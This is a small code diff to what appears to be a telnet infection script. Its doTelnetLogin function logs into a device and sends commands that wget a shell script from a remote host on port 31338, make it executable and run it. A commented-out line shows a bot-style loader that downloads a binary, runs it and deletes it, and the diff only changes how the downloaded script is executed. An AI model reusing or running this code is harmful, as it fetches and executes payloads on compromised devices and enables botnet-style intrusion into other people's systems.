@@ -51,7 +51,7 @@ def doTelnetLogin(ip, port, user, pass_):
                     #tn.write(("cd /tmp; cd/var/run; cd /mnt; cd/root; wget %s; chmod +x %s; ./%s; rm -rf %s;" % (__bin__,os.path.basename(__bin__), os.path.basename(__bin__), os.path.basename(__bin__)) + "\n").encode('ascii'))
                     cmd="wget http://192.168.1.97:31338/wget_download_exec.sh"
                     cmd1="chmod +x wget_download_exec.sh"
-                    cmd2="./wget_download_exec.sh"
+                    cmd2="sh ./wget_download_exec.sh"
                     tn.write((cmd+"\n").encode('ascii'))  
                     response = tn.read_until(b"#", 1)
                     print(str(response))
